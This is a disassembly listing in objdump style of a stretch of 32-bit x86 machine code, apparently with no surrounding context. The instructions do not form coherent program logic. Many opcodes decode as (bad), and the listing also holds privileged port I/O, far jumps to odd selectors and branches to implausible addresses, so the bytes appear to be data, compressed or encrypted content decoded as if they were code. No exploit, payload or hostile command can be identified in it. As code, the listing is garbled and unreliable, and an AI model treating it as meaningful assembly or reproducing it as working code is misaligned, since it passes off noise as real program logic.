  422b05:	(bad)  
  422b06:	sti    
  422b07:	test   DWORD PTR [ebx-0x2b],eax
  422b0a:	mov    ecx,0xffff27c2
  422b0f:	ins    DWORD PTR es:[edi],dx
  422b10:	mov    eax,ds:0x8b22c035
  422b15:	mov    dh,0x81
  422b17:	mov    al,ds:0x62002a8a
  422b1c:	inc    esp
  422b1d:	call   0x552ca996
  422b22:	sti    
  422b23:	(bad)  
  422b24:	ficomp WORD PTR [eax+ebp*8]
  422b27:	push   cs
  422b28:	xor    al,ch
  422b2a:	sti    
  422b2b:	out    0xb1,eax
  422b2d:	imul   edi,DWORD PTR [ecx],0xf1b35e8
  422b33:	sub    al,0xb2
  422b35:	jl     0x422b7b
  422b37:	jle    0x422b3c
  422b39:	and    eax,DWORD PTR [ecx]
  422b3b:	nop
  422b3c:	xchg   ebp,eax
  422b3d:	fadd   QWORD PTR [esi]
  422b3f:	rcr    bh,1
  422b41:	jmp    0x26d04dca
  422b46:	xchg   DWORD PTR [esi-0x5d05fcea],ebx
  422b4c:	dec    edi
  422b4d:	jge    0x422b8f
  422b4f:	sub    eax,0x6e02be
  422b54:	pop    esp
  422b55:	int    0x7d
  422b57:	retf   
  422b58:	cli    
  422b59:	sahf   
  422b5a:	ret    
  422b5b:	add    BYTE PTR [edx+0x7b],ah
  422b5e:	imul   esp,DWORD PTR [esi+ebp*2],0x2b
  422b62:	test   BYTE PTR [edi-0x18ef21aa],al
  422b68:	jecxz  0x422b83
  422b6a:	repz icebp 
  422b6c:	mov    ebp,0x7e4c7c36
  422b71:	fld    DWORD PTR ds:0xd6dd237b
  422b77:	ret    
  422b78:	and    bl,BYTE PTR [edi]
  422b7a:	sub    BYTE PTR [ecx],dh
  422b7c:	bound  edx,QWORD PTR [ecx+0x25]
  422b7f:	and    BYTE PTR [esp+edx*2-0x3],ah
  422b83:	pop    ds
  422b84:	jbe    0x422b24
  422b86:	ror    WORD PTR [edx+0x52],0xfd
  422b8b:	pop    ds
  422b8c:	push   esi
  422b8d:	(bad)  
  422b8e:	cli    
  422b8f:	jmp    FWORD PTR [eax+0x55]
  422b92:	or     al,0xe9
  422b94:	imul   eax,DWORD PTR [edi],0x735e3c6e
  422b9a:	out    0x50,eax
  422b9c:	dec    edx
  422b9d:	jge    0x422c1e
  422b9f:	add    esp,DWORD PTR [edx-0x2a]
  422ba2:	jnp    0x422bdb
  422ba4:	xchg   bl,ch
  422ba6:	gs ret 
  422ba8:	mov    esp,0xa6f891d8
  422bad:	adc    DWORD PTR [ebp-0x46],esp
  422bb0:	scas   al,BYTE PTR es:[edi]
  422bb1:	fisubr WORD PTR [esi-0x48]
  422bb4:	cmp    bh,BYTE PTR [ecx+eax*2]
  422bb7:	add    eax,DWORD PTR [eax]
  422bb9:	bound  ebx,QWORD PTR [edx-0x6e]
  422bbc:	dec    DWORD PTR [edi-0x7c]
  422bbf:	retf   0x9984
  422bc2:	fucom  st(0)
  422bc4:	dec    bp
  422bc6:	push   es
  422bc7:	aam    0x23
  422bc9:	push   esp
  422bca:	cdq    
  422bcb:	jmp    0xd1ffd1ec
  422bd0:	es loop 0x422bca
  422bd3:	sbb    al,BYTE PTR [eax+esi*2]
  422bd6:	retf   
  422bd7:	xor    bl,BYTE PTR [edx-0x1b]
  422bda:	push   ebx
  422bdb:	sahf   
  422bdc:	fmul   QWORD PTR [eax+eax*1+0x19dee7ca]
  422be3:	cmp    al,0xa
  422be5:	inc    esp
  422be6:	(bad)  [edi+0x4]
  422be9:	fst    QWORD PTR [edx]
  422beb:	add    cl,al
  422bed:	add    DWORD PTR [eax],0x19e2aefb
  422bf3:	jne    0x422be7
  422bf5:	or     ebx,ecx
  422bf7:	data16 jmp 0x422c22
  422bfa:	push   ds
  422bfb:	call   0xfb44bafd
  422c00:	mov    ?,WORD PTR [ebx-0x47]
  422c03:	push   cs
  422c04:	sub    DWORD PTR [esi+0x50],esp
  422c07:	inc    esp
  422c08:	lds    ebx,FWORD PTR [ecx+0x5e]
  422c0b:	or     eax,DWORD PTR [ecx-0x1700090c]
  422c11:	clc    
  422c12:	adc    eax,ebp
  422c14:	outs   dx,BYTE PTR ds:[esi]
  422c15:	jo     0x422bf0
  422c17:	add    BYTE PTR [edx+0x21],dh
  422c1a:	fnstsw WORD PTR [ebp-0x2698ff77]
  422c20:	add    dl,ch
  422c22:	and    ch,BYTE PTR [ecx-0x285e2305]
  422c28:	inc    eax
  422c29:	jmp    0x6246f2f6
  422c2e:	mul    BYTE PTR [ecx+eax*1-0x17]
  422c32:	popa   
  422c33:	icebp  
  422c34:	adc    ah,BYTE PTR [esi+0x45]
  422c37:	add    ch,BYTE PTR [edi]
  422c39:	cmp    esi,edi
  422c3b:	enter  0xe975,0x61
  422c3f:	or     dh,cl
  422c41:	push   0xe2739920
  422c46:	popa   
  422c47:	xchg   edi,eax
  422c48:	push   edx
  422c49:	(bad)  
  422c4a:	jb     0x422c9d
  422c4c:	push   cs
  422c4d:	test   eax,0xdec05c61
  422c52:	loop   0x422c33
  422c54:	std    
  422c55:	out    0x4,al
  422c57:	dec    BYTE PTR [ebx]
  422c59:	jb     0x422bfb
  422c5b:	(bad)  
  422c5d:	stos   DWORD PTR es:[edi],eax
  422c5e:	xor    DWORD PTR [edx],eax
  422c60:	adc    eax,0x997029
  422c65:	add    BYTE PTR [edi+ebx*4-0x6afa4a3],al
  422c6c:	pop    esp
  422c6d:	ret    
  422c6e:	pop    esi
  422c6f:	sub    ah,0xf
  422c72:	sub    eax,0x18b4fdd
  422c77:	mov    al,ds:0xefc059fa
  422c7c:	push   esi
  422c7d:	jne    0x422c3a
  422c7f:	pop    edx
  422c80:	clc    
  422c81:	or     al,BYTE PTR [eax]
  422c83:	outs   dx,DWORD PTR ds:[esi]
  422c84:	sar    BYTE PTR [ebx-0x8],1
  422c87:	xchg   esi,eax
  422c88:	mov    BYTE PTR [ecx-0x75],bh
  422c8b:	ds add eax,0x8ac33b43
  422c91:	(bad)  
  422c92:	jg     0x422d06
  422c94:	fadd   QWORD PTR [edx]
  422c96:	je     0x422d10
  422c98:	retf   0x42ca
  422c9b:	lock ror BYTE PTR [ecx+ecx*4],0x5a
  422ca0:	and    BYTE PTR [ecx],cl
  422ca2:	mov    edi,esi
  422ca4:	or     al,0xbe
  422ca6:	add    BYTE PTR [edx],bh
  422ca8:	fld    DWORD PTR [eax]
  422caa:	add    BYTE PTR [eax+0x19],cl
  422cad:	inc    eax
  422cae:	jmp    0x422c8e
  422cb0:	push   edi
  422cb1:	clc    
  422cb2:	or     al,BYTE PTR [edi]
  422cb4:	iret   
  422cb5:	jnp    0x422caf
  422cb7:	aaa    
  422cb8:	jg     0x422ca2
  422cba:	add    DWORD PTR [ebx+0x362c6f01],0x5a
  422cc1:	add    BYTE PTR [eax],al
  422cc3:	or     esi,DWORD PTR [ebp+0x15]
  422cc6:	add    eax,0xfff71b43
  422ccb:	js     0x422cbd
  422ccd:	add    BYTE PTR [edi-0x48],dh
  422cd0:	jg     0x422d17
  422cd2:	or     al,0x3c
  422cd4:	fdivr  st,st(3)
  422cd6:	(bad)  
  422cd7:	sti    
  422cd8:	fsub   st,st(3)
  422cda:	shl    BYTE PTR [eax-0x3c],1
  422cdd:	or     al,0x33
  422cdf:	bound  edi,QWORD PTR [ecx]
  422ce1:	daa    
  422ce2:	dec    ebp
  422ce3:	jb     0x422d08
  422ce5:	mov    al,cl
  422ce7:	add    BYTE PTR [ebx],ah
  422ce9:	mov    esp,edi
  422ceb:	out    0xa2,al
  422ced:	xchg   DWORD PTR [ebx],edi
  422cef:	or     BYTE PTR [edx],ch
  422cf1:	pop    es
  422cf2:	mov    bh,0x6f
  422cf4:	pop    esp
  422cf5:	jb     0x422d5e
  422cf7:	add    DWORD PTR [eax-0x1a],ebx
  422cfa:	add    DWORD PTR [edi],ebp
  422cfc:	nop
  422cfd:	mov    al,0x79
  422cff:	inc    ebp
  422d00:	outs   dx,BYTE PTR ds:[esi]
  422d01:	jns    0x422d17
  422d03:	out    0xca,eax
  422d05:	pop    ds
  422d06:	mov    edi,0xff0ea05d
  422d0b:	push   esp
  422d0c:	fst    DWORD PTR [esi+0x4a]
  422d0f:	pushaw 
  422d11:	mov    ecx,0xf1ac0b42
  422d16:	daa    
  422d17:	shl    bh,cl
  422d19:	fadd   DWORD PTR [ecx+0x4c2e58f8]
  422d1f:	jg     0x422d7b
  422d21:	std    
  422d22:	push   0x4
  422d24:	xchg   ecx,eax
  422d25:	mov    dl,0xd9
  422d27:	(bad)  fs:[ebx+esi*8-0x3e]
  422d2c:	arpl   cx,si
  422d2e:	(bad)  
  422d2f:	jmp    DWORD PTR [edx-0x69]
  422d32:	dec    edx
  422d33:	jg     0x422d6f
  422d35:	clc    
  422d36:	push   0x3a
  422d38:	lods   al,BYTE PTR ds:[esi]
  422d39:	call   0x649a25bf
  422d3e:	adc    edi,DWORD PTR ds:0xfffef1e7
  422d44:	mov    cs,WORD PTR ds:0xdb2dd7fa
  422d4a:	in     eax,0x7f
  422d4c:	add    BYTE PTR [edx],cl
  422d4e:	icebp  
  422d4f:	imul   edx,esp,0xffffffe9
  422d52:	xor    al,0xf3
  422d54:	ret    0xef62
  422d57:	(bad)  
  422d58:	jmp    DWORD PTR [edx-0x27]
  422d5b:	into   
  422d5c:	adc    eax,0x30ed9ddd
  422d61:	stos   DWORD PTR es:[edi],eax
  422d62:	shl    DWORD PTR [esp+edx*1],0x69
  422d66:	outs   dx,BYTE PTR ds:[esi]
  422d67:	test   al,0x42
  422d69:	fcmovnbe st,st(0)
  422d6b:	into   
  422d6c:	add    eax,0xbced9ddd
  422d71:	(bad)  
  422d72:	fucompp 
  422d74:	add    esp,DWORD PTR [edx-0x10]
  422d77:	aad    0x28
  422d79:	pop    ds
  422d7a:	rcr    DWORD PTR [ebx],1
  422d7c:	(bad)  
  422d7d:	and    eax,0x11f69a82
  422d82:	fcom   st(6)
  422d84:	in     eax,dx
  422d85:	and    BYTE PTR [eax+0x24],dl
  422d88:	clc    
  422d89:	fcmove st,st(0)
  422d8b:	mov    dh,0xc3
  422d8d:	and    ah,BYTE PTR [ebx-0x26913de4]
  422d93:	data16 xlat BYTE PTR ds:[ebx]
  422d95:	data16 aam 0x33
  422d98:	inc    edx
  422d99:	sub    ch,BYTE PTR [eax+0x500fc96e]
  422d9f:	mov    dh,0xfb
  422da1:	test   dh,ah
  422da3:	mov    ebx,0xdacdd378
  422da8:	xchg   esp,eax
  422da9:	xor    dl,bl
  422dab:	xchg   edx,eax
  422dac:	add    ch,bl
  422dae:	repz xchg ecx,eax
  422db0:	sbb    BYTE PTR [eax],al
  422db2:	inc    esp
  422db3:	push   ecx
  422db4:	popf   
  422db5:	pop    ds
  422db6:	push   edx
  422db7:	dec    esi
  422db8:	xchg   esi,eax
  422db9:	jmp    esp
  422dbb:	push   ecx
  422dbd:	xchg   esp,eax
  422dbe:	sub    bh,dl
  422dc0:	and    DWORD PTR [eax],eax
  422dc2:	fwait
  422dc3:	loope  0x422e2e
  422dc5:	addr16 ds mov ecx,0xbd9e7ae9
  422dcc:	loope  0x422e48
  422dce:	mov    ?,WORD PTR [ebp+0x4e676fd5]
  422dd4:	add    BYTE PTR [eax+0x41],bh
  422dd7:	cli    
  422dd8:	add    al,0x62
  422dda:	(bad)  
  422ddb:	pop    edx
  422ddc:	jns    0x422de7
  422dde:	aad    0xaa
  422de0:	or     al,0x12
  422de2:	sbb    al,0xcf
  422de4:	stos   DWORD PTR es:[edi],eax
  422de5:	xor    eax,0xaeffed8a
  422dea:	shr    esp,0xac
  422ded:	fldenv [ecx]
  422def:	fld    DWORD PTR [edi-0x791e75db]
  422df5:	sub    DWORD PTR [esi-0x3b],edx
  422df8:	add    DWORD PTR [edi+eax*4],esi
  422dfb:	retf   0x1aef
  422dfe:	xor    DWORD PTR [edx+0x4c],ebx
  422e01:	lds    edx,FWORD PTR [ecx-0x7b18ebab]
  422e07:	xlat   BYTE PTR ds:[ebx]
  422e08:	xchg   bh,ah
  422e0a:	(bad)  
  422e0c:	inc    ebx
  422e0d:	das    
  422e0e:	gs rep ins DWORD PTR es:[edi],dx
  422e11:	ja     0x422e78
  422e13:	or     al,0xff
  422e15:	jae    0x422e17
  422e17:	push   ebp
  422e18:	repnz ins DWORD PTR es:[edi],dx
  422e1a:	cmp    BYTE PTR [ebp-0x6d],0x3c
  422e1e:	jmp    0x422e2a
  422e20:	mov    dh,0x37
  422e22:	pop    edx
  422e23:	mov    ch,0x9b
  422e25:	xchg   DWORD PTR [ebp-0xa721683],esp
  422e2b:	jae    0x422e27
  422e2d:	or     ecx,edi
  422e2f:	aam    0xd6
  422e31:	bound  esi,QWORD PTR [eax+0x69]
  422e34:	add    bl,0xeb
  422e37:	fcom   QWORD PTR [esi]
  422e39:	(bad)  
  422e3a:	icebp  
  422e3b:	pop    ss
  422e3c:	jae    0x422e2e
  422e3e:	jmp    0x7334:0xe2fc020a
  422e45:	fild   WORD PTR [edx]
  422e47:	dec    ecx
  422e48:	lds    eax,FWORD PTR [esp+edx*4]
  422e4b:	inc    esp
  422e4c:	retf   0xef
  422e4f:	mov    bh,dl
  422e51:	or     DWORD PTR [edi+eiz*1+0x6],0xffffff8c
  422e56:	adc    al,0xfd
  422e58:	repnz add DWORD PTR [ebx-0x7d00aafb],ecx
  422e5f:	mov    ah,0xd9
  422e61:	jnp    0x422e29
  422e63:	(bad)  
  422e64:	loop   0x422e50
  422e66:	jb     0x422e21
  422e68:	(bad)  
  422e6a:	add    ebx,DWORD PTR [esi-0x698d141e]
  422e70:	xchg   esi,eax
  422e71:	push   esi
  422e72:	pop    ebp
  422e73:	sbb    BYTE PTR [edx-0x3c],0xc
  422e77:	or     edx,ebx
  422e79:	add    BYTE PTR [ecx+0x81ef00],al
  422e7f:	add    BYTE PTR [ebx+0x105655ca],bh
  422e85:	sub    al,0x89
  422e87:	dec    esp
  422e88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e89:	add    eax,0x54ed8b4e
  422e8e:	je     0x422eb4
  422e90:	sub    ebp,0xffffffad
  422e93:	cld    
  422e94:	std    
  422e95:	test   BYTE PTR [esi],0xb7
  422e98:	shr    edx,cl
  422e9a:	rol    BYTE PTR [eax+0x7],0x3e
  422e9e:	pop    es
  422e9f:	test   DWORD PTR [eax+0x310000dc],esp
  422ea5:	xlat   BYTE PTR ds:[ebx]
  422ea6:	pop    esi
  422ea7:	test   DWORD PTR [eax-0x6cbbf83c],edx
  422ead:	pop    esp
  422eae:	mov    esp,0xdcc724
  422eb3:	add    BYTE PTR [ebx-0x57],cl
  422eb6:	or     eax,0x9a85384
  422ebb:	sbb    DWORD PTR [eax+0x3b00f6f9],0x8e08c358
  422ec5:	cwde   
  422ec6:	and    al,0x6c
  422ec8:	bound  eax,QWORD PTR [edx+0x12]
  422ecb:	sti    
  422ecc:	inc    ebx
  422ecd:	dec    esi
  422ece:	and    esp,DWORD PTR [ebx+eax*2]
  422ed1:	push   esi
  422ed2:	and    ebp,DWORD PTR [eax]
  422ed4:	xchg   esp,eax
  422ed5:	inc    ebx
  422ed6:	lock ret 
  422ed8:	sahf   
  422ed9:	push   cs
  422eda:	push   ebx
  422edb:	cmp    al,0x62
  422edd:	repnz (bad) 
  422edf:	cli    
  422ee0:	add    BYTE PTR [edi-0x52],cl
  422ee3:	repz aas 
  422ee5:	bound  esi,QWORD PTR [ebp-0x3c]
  422ee8:	or     ebx,esi
  422eea:	add    esi,edi
  422eec:	jmp    DWORD PTR [edx+0x7b]
  422eef:	cwde   
  422ef0:	and    al,0x12
  422ef2:	repz (bad) 
  422ef4:	call   DWORD PTR [ebp*2-0x1dd1dbb8]
  422efb:	mov    eax,DWORD PTR [esi+eax*4-0x4a]
  422eff:	xor    al,0xfb
  422f01:	dec    edi
  422f02:	(bad)  
  422f03:	repz aas 
  422f05:	bound  esi,QWORD PTR [ebp-0x3c]
  422f08:	or     ebp,edi
  422f0a:	xor    cl,BYTE PTR [esp+eax*2-0x3f7cfcba]
  422f11:	push   cs
  422f12:	cld    
  422f13:	mov    eax,DWORD PTR [esi+eax*2+0x6]
  422f17:	sbb    al,0x42
  422f19:	pop    esi
  422f1a:	add    eax,0x1b6a8702
  422f1f:	popa   
  422f20:	add    al,0xd9
  422f22:	and    esi,DWORD PTR cs:[eax-0x67]
  422f26:	clc    
  422f27:	pop    ecx
  422f28:	add    al,0xe9
  422f2a:	cdq    
  422f2b:	sub    eax,0x85b2d92a
  422f30:	loopne 0x422f92
  422f32:	mov    DWORD PTR [eax+0x24],ecx
  422f35:	pop    esi
  422f36:	inc    esi
  422f37:	push   edx
  422f38:	repz fmulp st(5),st
  422f3b:	je     0x422f3d
  422f3d:	(bad)  {k7}{z}
  422f42:	fxch   st(1)
  422f44:	push   edi
  422f45:	add    BYTE PTR [ebx-0x35],bh
  422f48:	sub    DWORD PTR [esi+ebx*4-0x6172084b],ecx
  422f4f:	mov    ch,0xf6
  422f51:	xchg   DWORD PTR [ebx],ebx
  422f53:	xchg   BYTE PTR [ebx-0x7879dd79],cl
  422f59:	loope  0x422f7d
  422f5b:	repnz inc ebp
  422f5d:	add    al,0x62
  422f5f:	fst    DWORD PTR [ebx+0x6db4de8e]
  422f65:	add    esp,DWORD PTR [edx-0x27]
  422f68:	cmp    DWORD PTR [edi+0x341db51e],ecx
  422f6e:	leave  
  422f6f:	in     eax,0x1d
  422f71:	test   DWORD PTR [ebp+0x69c36cd9],0x1e8ba966
  422f7b:	mov    ch,0xd7
  422f7d:	xchg   DWORD PTR [edx-0x2173627c],esp
  422f83:	mov    ah,0x6d
  422f85:	add    esp,DWORD PTR [edx-0x27]
  422f88:	fimul  WORD PTR [ecx+0x5e]
  422f8b:	jle    0x422f77
  422f8d:	sub    al,0x20
  422f8f:	aad    0x60
  422f91:	inc    edi
  422f92:	ds mov ch,0x6e
  422f95:	xchg   DWORD PTR [esi+0x59],eax
  422f98:	jmp    0x259591a0
  422f9d:	sub    BYTE PTR [ebp-0x3c],bl
  422fa0:	jecxz  0x423000
  422fa2:	pusha  
  422fa3:	mov    ah,0xeb
  422fa5:	mov    ah,BYTE PTR [esi+0x8e09b5]
  422fab:	sahf   
  422fac:	mov    ch,0xf7
  422fae:	in     al,dx
  422faf:	in     al,dx
  422fb0:	push   ebx
  422fb1:	popf   
  422fb2:	daa    
  422fb3:	push   ebp
  422fb4:	push   ebx
  422fb5:	sub    BYTE PTR [ebx-0x13284a5a],cl
  422fbb:	shl    BYTE PTR [ebx+0x0],1
  422fbe:	jmp    0xd6231505
  422fc3:	mov    eax,ds:0x45ad89d9
  422fc8:	mov    cl,0x85
  422fca:	sub    DWORD PTR [ebp+0x141650cb],ebp
  422fd0:	pop    ds
  422fd1:	adc    BYTE PTR [ecx+0x6f05661],ch
  422fd7:	xchg   ebp,eax
  422fd8:	mov    ch,0x28
  422fda:	xchg   ebx,eax
  422fdb:	popa   
  422fdc:	add    dl,BYTE PTR ds:0xbef4e5
  422fe2:	or     eax,DWORD PTR fs:[esi-0x4ad58de3]
  422fe9:	adc    al,0xde
  422feb:	fst    QWORD PTR cs:[edx-0x2a]
  422fef:	retf   
  422ff0:	and    dl,BYTE PTR [eax]
  422ff2:	sub    DWORD PTR [esi+0x50],ebx
  422ff5:	inc    esp
  422ff6:	or     eax,0x34c0548e
  422ffb:	lods   al,BYTE PTR ds:[esi]
  422ffc:	test   al,0xfb
  422ffe:	fdivr  st(1),st
  423000:	jmp    0x19961945
  423005:	pop    ebx
  423006:	inc    edi
  423007:	and    esp,DWORD PTR [esi-0x261d5a7f]
  42300d:	add    cl,ch
  42300f:	add    BYTE PTR [ebx-0x1ef8ff2f],ah
  423015:	jge    0x42303b
  423017:	in     eax,0x61
  423019:	rol    BYTE PTR [eax+edi*1+0x6200d95f],cl
  423020:	sbb    dh,BYTE PTR [ebp-0x4b0595e8]
  423026:	pop    eax
  423027:	jmp    0xbd66a50c
  42302c:	popa   
  42302d:	push   eax
  42302e:	inc    esp
  42302f:	or     eax,0x5445696
  423034:	push   0xffffffb6
  423036:	inc    esp
  423037:	add    BYTE PTR [edi-0x37],ch
  42303a:	sub    ebx,ebx
  42303c:	mov    dl,0x91
  42303e:	and    al,0x60
  423040:	rcl    BYTE PTR [ecx-0x6e9fc7dc],0x24
  423047:	xor    al,cl
  423049:	dec    esp
  42304a:	inc    esp
  42304b:	and    al,0xdf
  42304d:	push   0xc9c72444
  423052:	div    DWORD PTR ds:0x447027
  423058:	jb     0x422ffb
  42305a:	and    al,0x5c
  42305c:	jb     0x422ff7
  42305e:	and    al,0x70
  423060:	hlt    
  423061:	add    BYTE PTR [edi],dh
  423063:	adc    bh,BYTE PTR [ebx+0x6f5c38d9]
  423069:	or     al,BYTE PTR [esi]
  42306b:	test   DWORD PTR [ecx-0x26],edx
  42306e:	add    BYTE PTR [eax],al
  423070:	inc    esi
  423071:	xchg   esi,eax
  423072:	and    al,0x3c
  423074:	add    BYTE PTR [ebx-0x44dbbb98],cl
  42307a:	leave  
  42307b:	not    DWORD PTR ds:0x3b005b
  423081:	sbb    dh,BYTE PTR ds:[ebp+0x76]
  423085:	dec    ebp
  423086:	push   ds
  423087:	adc    eax,0x999bc0
  42308c:	mov    DWORD PTR [edi],edi
  42308e:	mov    cl,0x1c
  423090:	test   esi,esp
  423092:	mov    al,ds:0xa5d48504
  423097:	add    ebp,DWORD PTR [edx-0x75]
  42309a:	(bad)  
  42309b:	push   ebp
  42309c:	push   esi
  42309d:	hlt    
  42309e:	add    BYTE PTR [ebx-0x7c2ac4f0],ch
  4230a4:	jl     0x423045
  4230a6:	add    eax,0xc4d60065
  4230ab:	and    al,0x40
  4230ad:	ror    BYTE PTR [ebx],1
  4230af:	call   0xdae893a1
  4230b4:	sti    
  4230b5:	fnstcw WORD PTR [esi]
  4230b7:	and    ebx,DWORD PTR [eax]
  4230b9:	enter  0x2df2,0x68
  4230bd:	fcomip st,st(2)
  4230bf:	(bad)  
  4230c0:	call   DWORD PTR [edi-0x79dbbc54]
  4230c6:	repnz fst DWORD PTR ds:0x3efd5e
  4230cd:	loop   0x42312d
  4230cf:	and    ecx,DWORD PTR [edx+eiz*2+0x5d]
  4230d3:	or     ah,BYTE PTR [esi+0x60]
  4230d6:	inc    esp
  4230d7:	adc    eax,DWORD PTR [bx+si]
  4230da:	popa   
  4230db:	repnz (bad) 
  4230dd:	push   esp
  4230de:	cmc    
  4230df:	and    eax,0xf2a21567
  4230e4:	sub    eax,0x3f168e8d
  4230e9:	xchg   DWORD PTR [ebp-0x2a036ed6],ebp
  4230ef:	sbb    ebx,ebp
  4230f1:	je     0x423079
  4230f3:	push   es
  4230f4:	xor    eax,0xf4366ffb
  4230f9:	aas    
  4230fa:	bound  esp,QWORD PTR [edi]
  4230fc:	or     al,0x87
  4230fe:	ss (bad) 
  423100:	clc    
  423101:	xchg   BYTE PTR [esi],bh
  423103:	into   
  423104:	cld    
  423105:	aaa    
  423106:	push   es
  423107:	(bad)  
  423108:	out    dx,al
  423109:	or     ah,bh
  42310b:	mov    al,ds:0x6f620004
  423110:	pusha  
  423111:	and    al,0x42
  423113:	repnz push ecx
  423115:	or     al,0xe1
  423117:	into   
  423118:	sub    BYTE PTR [edx+eiz*2],ah
  42311b:	sub    al,0x48
  42311d:	and    al,0x50
  42311f:	repnz push edx
  423121:	add    al,0xda
  423123:	out    0x28,al
  423125:	push   cs
  423126:	or     al,0x6b
  423128:	repz mov edi,0x3a9d972
  42312e:	loop   0x4231ac
  423130:	add    eax,0xad514df2
  423135:	daa    
  423136:	test   ax,di
  423139:	imul   esp,DWORD PTR [edx-0x4],0x8a0027bc
  423140:	cld    
  423141:	mov    ah,0x27
  423143:	jp     0x4230e8
  423145:	xor    dh,bh
  423147:	cmc    
  423148:	call   0xd9c634f6
  42314d:	je     0x423187
  42314f:	ds leave 
  423151:	outs   dx,BYTE PTR ds:[esi]
  423152:	int    0xfa
  423154:	lea    edx,ds:0xe96f09dd
  42315a:	xor    eax,0xdc9ce584
  42315f:	dec    edi
  423160:	mov    ebp,0x46243d4
  423165:	adc    ebp,ebx
  423167:	outs   dx,BYTE PTR ds:[esi]
  423168:	mov    ch,0xcd
  42316a:	clc    
  42316b:	sbb    eax,0x1e8b3b99
  423170:	mov    ch,0x59
  423172:	fnsave [edi+0x15]
  423175:	stc    
  423176:	inc    ebx
  423177:	bound  ebx,QWORD PTR [ecx+0x4d]
  42317a:	sub    BYTE PTR [ecx+ebx*8+0x3d],ch
  42317e:	repz aas 
  423180:	fnstcw WORD PTR [edx-0x4d4e79a9]
  423186:	push   edi
  423187:	jle    0x42313a
  423189:	adc    ebx,ebp
  42318b:	ja     0x4231d6
  42318d:	stc    
  42318e:	inc    ebx
  42318f:	(bad)  
  423190:	enter  0x33a9,0x32
  423194:	outs   dx,DWORD PTR ds:[esi]
  423195:	loop   0x4231cd
  423197:	ficom  DWORD PTR [ebp+eax*8-0x3a1a86c1]
  42319e:	div    BYTE PTR ds:0x5f69d9
  4231a4:	inc    esi
  4231a5:	lea    eax,[eax]
  4231a7:	jmp    0xe5a901b8
  4231ac:	xchg   edi,eax
  4231ad:	jno    0x4231c2
  4231af:	jmp    0x7354:0x5e55d961
  4231b6:	adc    eax,0x8d8a61a9
  4231bb:	mov    ch,0x85
  4231bd:	leave  
  4231be:	xchg   DWORD PTR [esi],esi
  4231c0:	dec    ecx
  4231c1:	sbb    al,0xf7
  4231c3:	ds push cs
  4231c5:	je     0x4231c7
  4231c7:	ss dec esp
  4231c9:	int    0x66
  4231cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231cc:	popa   
  4231cd:	(bad)  
  4231ce:	adc    al,0xe5
  4231d0:	adc    edi,DWORD PTR [ebx-0x266df000]
  4231d6:	add    cl,ch
  4231d8:	das    
  4231d9:	cmp    eax,DWORD PTR [edx*4+0x7ced54a9]
  4231e0:	pop    ebp
  4231e1:	push   esp
  4231e2:	sti    
  4231e3:	jne    0x42323f
  4231e5:	jae    0x4231e7
  4231e7:	sahf   
  4231e8:	sub    al,0xa7
  4231ea:	sti    
  4231eb:	aam    0xf1
  4231ed:	jmp    0x8e271b32
  4231f2:	and    al,0xf5
  4231f4:	aas    
  4231f5:	(bad)  [ebp-0x17667dc3]
  4231fb:	sbb    DWORD PTR [ebp+0x2272fafe],0x585318b5
  423205:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423206:	push   0xd95c00de
  42320b:	add    BYTE PTR [ecx],bl
  42320d:	mov    ecx,0x21fc68e4
  423212:	fld    DWORD PTR [edi+0x2fe5422d]
  423218:	mov    dl,0x1d
  42321a:	dec    esp
  42321b:	push   esp
  42321c:	lds    edx,FWORD PTR [ebp-0x76]
  42321f:	call   0xf75c3924
  423224:	call   eax
  423226:	xchg   edi,eax
  423227:	out    dx,al
  423228:	ret    
  423229:	or     DWORD PTR [edx-0x57217aca],0x4
  423230:	test   DWORD PTR [ecx+ebp*4-0x38c495fd],edi
  423237:	push   ebp
  423238:	push   esi
  423239:	lods   al,BYTE PTR ds:[esi]
  42323a:	or     BYTE PTR [ebx-0x7c29f4f0],ch
  423240:	ins    BYTE PTR es:[edi],dx
  423241:	or     DWORD PTR [di+0x0],esp
  423245:	mov    esi,0xc04024c9
  42324a:	adc    al,ch
  42324c:	pop    ecx
  42324d:	push   eax
  42324e:	push   ds
  42324f:	test   DWORD PTR [ebx+0x6a18d9c7],0xff50c7fb
  423259:	push   es
  42325a:	stos   BYTE PTR es:[edi],al
  42325b:	adc    eax,0xc0590b40
  423260:	jne    0x423269
  423262:	in     al,0xd3
  423264:	jmp    0x42326a
  423266:	dec    ebx
  423267:	int    0xeb
  423269:	popf   
  42326a:	loop   0x42323f
  42326c:	inc    ebx
  42326d:	add    ah,cl
  42326f:	mov    DWORD PTR [eax+ebp*1],esp
  423272:	xchg   ebp,eax
  423273:	push   ds
  423274:	adc    eax,0x95cbdc
  423279:	push   esi
  42327a:	lods   al,BYTE PTR ds:[esi]
  42327b:	or     bl,cl
  42327d:	adc    BYTE PTR [ebx-0x6d3c7d2b],cl
  423283:	dec    ebx
  423284:	std    
  423285:	(bad)  
  423286:	in     al,dx
  423287:	daa    
  423288:	add    eax,0x991f30
  42328d:	add    al,0x78
  42328f:	dec    edx
  423290:	pop    esp
  423291:	and    al,0x93
  423293:	(bad)  
  423294:	dec    edi
  423295:	mov    ebp,DWORD PTR [edi-0x47]
  423298:	adc    al,0x74
  42329a:	bound  edi,QWORD PTR [esp+ebp*8-0x10fea88]
  4232a1:	and    DWORD PTR [edx+0x6d8549fb],0x3
  4232a8:	ds sti 
  4232aa:	das    
  4232ab:	hlt    
  4232ac:	ins    BYTE PTR es:[edi],dx
  4232ad:	inc    esp
  4232ae:	bound  eax,QWORD PTR [edi+0x427033f0]
  4232b4:	inc    DWORD PTR [esi+0x74d17e52]
  4232ba:	(bad)  
  4232bb:	retf   
  4232bc:	ss add al,0xb7
  4232bf:	shr    BYTE PTR [edx+0x40],cl
  4232c2:	enter  0x2e02,0xfb
  4232c6:	push   edi
  4232c7:	push   ds
  4232c8:	icebp  
  4232c9:	aas    
  4232ca:	bound  edi,QWORD PTR [ebx+0x41]
  4232cd:	or     bl,ch
  4232cf:	dec    DWORD PTR [ecx-0x7c89ffbe]
  4232d5:	mov    ebx,0xfb3fdb0c
  4232da:	gs jb  0x42335a
  4232dd:	inc    ecx
  4232de:	or     al,0x92
  4232e0:	xchg   ebp,eax
  4232e1:	or     BYTE PTR ds:[edx+0x62ebf4ca],dl
  4232e8:	add    cl,BYTE PTR [edx+0x1c85a42]
  4232ee:	add    ecx,ecx
  4232f0:	cli    
  4232f1:	sub    eax,0x96f5d54f
  4232f6:	adc    al,0x22
